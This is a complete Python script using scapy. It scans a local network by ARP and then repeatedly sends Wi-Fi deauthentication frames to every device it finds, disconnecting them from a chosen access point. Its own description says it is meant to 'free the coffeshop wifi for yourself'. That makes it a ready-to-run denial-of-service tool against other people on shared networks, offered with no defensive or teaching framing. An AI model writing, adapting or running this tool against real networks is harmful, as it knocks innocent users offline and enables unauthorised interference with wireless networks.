import argparse
import time
import signal

from typing import TypedDict, List
from scapy.all import ARP, Ether, srp, send, RadioTap, Dot11, Dot11Deauth, sendp

DEFAULT_IP_RANGE = "192.168.1.0/24"

class Device(TypedDict):
    ip: str
    mac: str

def signal_handler(sig, frame): exit()
signal.signal(signal.SIGINT, signal_handler)

def cstr(c, s, b=False):
    cs = {'red': '31', 'green': '32', 'yellow': '33', 'blue': '34', 'magenta': '35', 'cyan': '36','white': '37', 'black': '30', 'orange': '38;5;208', 'purple': '38;5;141', 'pink': '38;5;217'}
    b = '1;' if b else ''
    return f'\033[{b}{cs[c]}m{s}\033[0m'

def scan_local_network(interface: str=None, timeout: int=3, ip_range: str=DEFAULT_IP_RANGE, verbose: bool=False) -> List[Device]:
    arp = ARP(pdst=ip_range)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp
    result = srp(packet, iface=interface, timeout=timeout, verbose=verbose)[0]
    return [{'ip': received.psrc, 'mac': received.hwsrc} for _, received in result]

def deauth(client_mac: str, bssid: str, iface: str, inter: float=0.02, count: int=20, verbose: bool=False): 
    deauth_packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
    sendp(deauth_packet, iface=iface, count=count, inter=inter, verbose=True)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="free the coffeshop wifi for yourself")
    parser.add_argument("bssid", help="bssid of target network address")
    parser.add_argument("-c" , "--count", help="number of deauthentication frames to send per target, default is 20", default=20)
    parser.add_argument("--inter", help="sending frequency between frames, default is 20ms", default=0.02)
    parser.add_argument("--attack-inter", help="round robin frequency, default is 5s", default=5)
    parser.add_argument("-i", dest="iface", help="deauth interface, must be in monitor mode")
    parser.add_argument("-si", dest="scan_iface", help="scanning interface", default=None)
    parser.add_argument("-v", "--verbose", action="store_true")
    args = parser.parse_args()
    bssid, count, inter, attack_inter, iface, verbose = args.bssid, int(args.count), float(args.inter), float(args.attack_inter), args.iface, args.verbose

    while True:
        devices = scan_local_network(iface)
        print(cstr("red", "Targets:", True))
        for d in devices: print(cstr("purple", f"{d['mac']} - {d['ip']}"))
        print('\n')
        for device in devices:
            print(cstr("orange", "IP: ", b=True), cstr("blue", f"{device['ip']}  "), cstr("orange", "MAC: "), cstr("blue", f"{device['mac']}"))
            deauth(device['mac'], bssid, iface, inter, count, verbose)
        time.sleep(attack_inter)
    